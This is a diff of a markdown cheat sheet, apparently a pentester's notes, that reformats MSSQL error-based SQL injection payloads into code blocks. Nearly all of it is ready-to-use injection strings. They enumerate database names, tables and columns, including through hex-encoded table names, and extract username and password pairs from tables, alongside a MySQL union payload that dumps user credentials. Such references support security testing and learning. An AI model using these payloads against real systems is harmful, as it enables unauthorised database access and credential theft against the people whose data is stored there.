@@ -406,23 +406,60 @@ php?xxx=9999999 union select 1,(select group_concat(host,user,password) FROM mys
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md
 https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet/tree/main/MSSQL%20-%20Error%20Based%20SQLi
 
-Check for database version: @@version, user: user_name() and: db_name() name with: ```and 1 in (select db_name())```\
+Check for database version: @@version, user: user_name() and: db_name() name with:
+```
+and 1 in (select db_name())
+```
 db_name() can be iterate with db_name(0), db_name(1), etc. to show different databases.
 
-Check for table names in a database: ```and 1 IN (select top 1 cast(name as varchar(4096)) from $DB_NAME..sysobjects where xtype = 'U')``` \
-Check for other table names: ```and 1 IN (select top 1 cast(name as varchar(4096)) from $DB_NAME..sysobjects where xtype = 'U' and name not in ('$TABLE_NAME'))```
+Check for table names in a database:
+```
+and 1 IN (select top 1 cast(name as varchar(4096)) from $DB_NAME..sysobjects where xtype = 'U')
+```
+Check for other table names:
+```
+and 1 IN (select top 1 cast(name as varchar(4096)) from $DB_NAME..sysobjects where xtype = 'U' and name not in ('$TABLE_NAME'))
+```
 
-Check for column names in a table: ```and 1 IN (select top 1 cast($DB_NAME..syscolumns.name as varchar(4096)) from $DB_NAME..syscolumns, $DB_NAME..sysobjects where $DB_NAME..syscolumns.id=$DB_NAME..sysobjects.id and $DB_NAME..sysobjects.name='$TABLE_NAME')``` (wtf right?) \
-OR \
-```and 1 IN (select top 1 column_name from information_schema.columns where TABLE_NAME=cast(0x636c75625f6d656d62657273 as varchar))``` where the 0x part is table name in hex.
-Check for the next column in a table: ```and 1 IN (select top 1 cast($DB_NAME..syscolumns.name as varchar(4096)) from $DB_NAME..syscolumns, $DB_NAME..sysobjects where $DB_NAME..syscolumns.id=$DB_NAME..sysobjects.id and $DB_NAME..sysobjects.name='$TABLE_NAME' and $DB_NAME..syscolumns.name NOT IN ('$COLUMN_NAME'))``` \
-OR like \
-```and 1 IN (select top 1 column_name from information_schema.columns where TABLE_NAME=cast(0x636c75625f6d656d62657273 as varchar)and column_name NOT IN ('id','name','username'))```: this should print out the next column.
+Check for column names in a table:
+```
+and 1 IN (select top 1 cast($DB_NAME..syscolumns.name as varchar(4096)) from $DB_NAME..syscolumns, $DB_NAME..sysobjects where $DB_NAME..syscolumns.id=$DB_NAME..sysobjects.id and $DB_NAME..sysobjects.name='$TABLE_NAME')
+```
+(wtf right?)
 
-Extract the username and password pair from a table: ```or 1 IN (select top 1 cast(username%2b':::'%2bpassword as varchar(4096)) from $DB_NAME..$TABLE_NAME)```: where %2b is for string concat, and ':::' is just a seperator. \
-Extract an username from a table: ```and 1 IN (select username from $TABLE_NAME)``` or another user: ```and 1 IN (select username from $TABLE_NAME where username!='$USERNAME')``` 
+OR
+```
+and 1 IN (select top 1 column_name from information_schema.columns where TABLE_NAME=cast(0x636c75625f6d656d62657273 as varchar))
+```
+where the 0x part is table name in hex. \
+Check for the next column in a table:
+```
+and 1 IN (select top 1 cast($DB_NAME..syscolumns.name as varchar(4096)) from $DB_NAME..syscolumns, $DB_NAME..sysobjects where $DB_NAME..syscolumns.id=$DB_NAME..sysobjects.id and $DB_NAME..sysobjects.name='$TABLE_NAME' and $DB_NAME..syscolumns.name NOT IN ('$COLUMN_NAME'))
+```
+OR like
+```
+and 1 IN (select top 1 column_name from information_schema.columns where TABLE_NAME=cast(0x636c75625f6d656d62657273 as varchar)and column_name NOT IN ('id','name','username'))
+```
+-> this should print out the next column.
 
-Or just extract the password if the username and table name is known: ```and 1 IN (select top 1 password from $TABLE_NAME where name='$USERNAME')```
+Extract the username and password pair from a table:
+```
+or 1 IN (select top 1 cast(username%2b':::'%2bpassword as varchar(4096)) from $DB_NAME..$TABLE_NAME)
+```
+where %2b is for string concat, and ':::' is just a seperator. \
+Extract an username from a table:
+```
+and 1 IN (select username from $TABLE_NAME)
+```
+or another user:
+```
+and 1 IN (select username from $TABLE_NAME where username!='$USERNAME')
+``` 
+
+Or just extract the password if the username and table name is known:
+```
+and 1 IN (select top 1 password from $TABLE_NAME where name='$USERNAME')
+```
 
 
 ### Blind/Boolean based SQL Injection:
